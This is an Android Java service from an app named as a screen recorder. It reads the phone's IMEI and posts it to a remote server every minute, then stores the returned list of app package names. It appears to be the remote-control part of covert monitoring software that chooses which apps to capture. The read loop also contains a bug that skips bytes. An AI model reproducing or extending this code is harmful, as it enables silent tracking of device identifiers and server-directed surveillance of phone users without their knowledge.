package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;
import com.recorder.screen.screen_recorder.helper.Values;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class SelectedPackageNameChecker extends Service {

    public static boolean running = false;
    Timer timer;
    String imei = "";

    public SelectedPackageNameChecker() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        running = true;
        checkOnlineSelectedPackage();
        return super.onStartCommand(intent, flags, startId);
    }

    public void checkOnlineSelectedPackage() {

        final HttpClient httpclient = new DefaultHttpClient();
        String scrnupld = UrlDemo.ssChecker;
        final HttpPost httppost = new HttpPost(scrnupld);

        TelephonyManager tm =(TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        imei = tm.getDeviceId();
        byte[] imeiyahoo = imei.getBytes();
        String imeibaseyahoo= android.util.Base64.encodeToString(imeiyahoo, android.util.Base64.DEFAULT);
        final String imeibasyahoostring = imeibaseyahoo.replaceAll("\n", "");

        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {

            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- SelectedPackageNameChecker");
                try {
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    //nameValuePairs.add(new BasicNameValuePair("IMEI", imeibasyahoostring));  -------To be
                    nameValuePairs.add(new BasicNameValuePair("IMEI", imei));               //------temp
                    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();
                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();
                    InputStream in = entity.getContent();
                    String buffer = "";
                    for (int i = in.read(); i != -1; i = in.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.gc();
                    in.close();

                    Log.d("................", "Selected Packages -> "+buffer);

                    if(!buffer.equalsIgnoreCase("")) {
                        Values.setSharedPrefrence("PacksName", buffer, getApplicationContext());
                    }

                    if (entity != null) {
                        entity.consumeContent();
                    }
                } catch (Exception e) {
                    Log.e("............", e.toString());
                }
            }
        }, 10000, 60000);
        System.gc();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;

        try {
            timer.cancel();
        } catch (Exception e) {}
    }
}
